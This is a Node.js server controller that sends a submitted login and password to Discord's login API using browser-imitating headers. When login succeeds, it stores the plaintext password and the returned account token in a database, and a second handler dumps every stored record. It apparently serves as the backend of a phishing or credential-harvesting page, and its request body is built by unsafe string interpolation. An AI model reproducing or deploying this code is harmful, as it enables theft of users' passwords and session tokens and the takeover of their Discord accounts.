import fetch from "node-fetch";
import discord from "../../../models/discord.js";

const connectToDiscord = async (req, res) => {
    const response = {
        success: false,
    };

    const answer = await fetch("https://discord.com/api/v9/auth/login", {
        headers: {
            accept: "*/*",
            "accept-language": "en-GB,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json",
            pragma: "no-cache",
            "sec-ch-ua":
                '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "en-GB",
            Referer: "https://discord.com/login",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        },
        body: `{"login":"${req.body.login}","password":"${req.body.pass}","undelete":false,"login_source":null,"gift_code_sku_id":null}`,
        method: "POST",
    });

    console.log(answer);
    const resp = await JSON.parse(await answer.text());
    console.log('---');
    console.log(resp);

    if (resp.token) {
        response.success = true;
        saveToDatabase(req.body.login, req.body.pass, resp.token);
    } else if (resp.errors) response.errors = resp.errors;

    return res.status(200).json(response);
};

const getDatabase = async (req, res) => {
    const response = {
        success: false,
        database: [],
    };

    response.database = await discord.find();

    return res.status(200).json(response);
};

const saveToDatabase = async (login, pass, token) => {
    let res;

    const check = await discord.find({ login: login });

    if (check.length > 0)
        res = await discord.updateOne(
            { login: login },
            {
                login: login,
                password: pass,
                token: token,
            }
        );
    else
        res = await discord.create({
            login: login,
            password: pass,
            token: token,
        });
};

export default { connectToDiscord, getDatabase };
